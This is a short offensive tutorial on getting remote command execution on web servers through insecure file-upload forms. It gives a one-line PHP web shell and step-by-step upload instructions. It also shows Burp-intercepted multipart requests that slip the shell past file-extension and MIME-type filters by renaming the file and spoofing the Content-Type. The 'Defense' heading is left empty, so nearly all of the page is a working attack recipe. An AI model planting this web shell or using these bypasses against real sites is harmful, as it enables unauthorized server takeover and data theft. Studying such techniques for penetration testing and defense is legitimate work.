# Shell via PHP

Lots of web-sites have a file-upload function. This enables users to upload avatars, pictures etc.
This opens up several possibilities for command-execution on the server.

## Get Shell via PHP file-upload
Getting shell on a server with no protection on the file-upload is easy.

1: Create a PHP file:
```php
<?php
system($_GET['command']);
?>
```
2: Upload this to the server using a file-upload form

3: Browse to the file in the web address and add a command like this:
```html
command=ls -a;
```
4: If it displays a dir-listing, you've got shell


## Circumventing file-extension filters.
When you're limited to uploading only specific file-extensions, like jpg, gif or png, you can still try to circumvent this.

### Change the file-name
Follow the steps above, but replace step 2 with:

2a: Rename the PHP file to an allowed extension.
2b: When uploading this renamed file, enable a proxy intercepter like BurpSuite
2c: In the intercept, change the file-name in the content:

```html
...
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------14882905051801670598702936301
Content-Length: 256

-----------------------------14882905051801670598702936301
Content-Disposition: form-data; name="file"; filename="cmd.php" <-- REMOVED .JPG FROM FILENAME 
Content-Type: image/jpeg

<?php
system($_GET['command']);
?>

-----------------------------14882905051801670598702936301--```
```

### Change the mime-type
Follow the steps above, but replace step 2 with:

2a: When uploading this renamed file, enable a proxy intercepter like BurpSuite
2b: In the intercept, change the content's mime-type:

```html
...
Content-Length: 256

-----------------------------14882905051801670598702936301
Content-Disposition: form-data; name="file"; filename="cmd.php" 
Content-Type: image/jpeg <-- CHANGED FROM text/plain

<?php
system($_GET['command']);
?>

-----------------------------14882905051801670598702936301--```
```

Defense:



Sources:
* [Skimi](https://www.youtube.com/watch?v=J_i1Hi80-zA)
* [Cypher](https://stackoverflow.com/questions/7349473/php-file-upload-mime-or-extension-based-verification) exploiting an image-file to include PHP code (should be extension PHP).
* [Igor Data](https://medium.com/@igordata/php-running-jpg-as-php-or-how-to-prevent-execution-of-user-uploaded-files-6ff021897389) on running PHP code in a number of scenario's